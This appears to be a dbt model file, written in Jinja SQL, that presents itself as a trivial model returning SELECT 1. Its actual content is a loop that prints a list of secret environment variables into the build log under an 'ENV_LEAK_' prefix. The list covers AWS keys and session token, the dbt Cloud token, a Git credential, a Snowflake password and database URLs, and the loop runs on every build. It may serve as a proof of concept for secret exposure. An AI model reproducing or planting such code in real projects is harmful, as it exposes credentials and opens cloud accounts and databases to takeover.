{% set env_vars_to_check = [
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AWS_SESSION_TOKEN',
    'AWS_DEFAULT_REGION',
    'DBT_ENV_SECRET_GIT_CREDENTIAL',
    'DBT_CLOUD_TOKEN',
    'DBT_CLOUD_PROJECT_ID',
    'DBT_CLOUD_ENVIRONMENT_ID',
    'DBT_CLOUD_JOB_ID',
    'DBT_CLOUD_RUN_ID',
    'DBT_CLOUD_RUN_REASON',
    'DBT_CLOUD_ACCOUNT_ID',
    'KUBERNETES_SERVICE_HOST',
    'KUBERNETES_SERVICE_PORT',
    'KUBERNETES_PORT',
    'HOME',
    'PATH',
    'USER',
    'HOSTNAME',
    'DATABASE_URL',
    'REDIS_URL',
    'SNOWFLAKE_ACCOUNT',
    'DATABRICKS_HOST',
    'DBT_ENV_SECRET_SNOWFLAKE_PASSWORD',
    'DBT_ENV_CUSTOM_ENV_SECRET',
    'GIT_SSH_COMMAND',
    'SSH_AUTH_SOCK'
] %}

{% for var_name in env_vars_to_check %}
{{ log("ENV_LEAK_" ~ var_name ~ "=" ~ env_var(var_name, 'NOT_SET'), info=True) }}
{% endfor %}

SELECT 1 as id
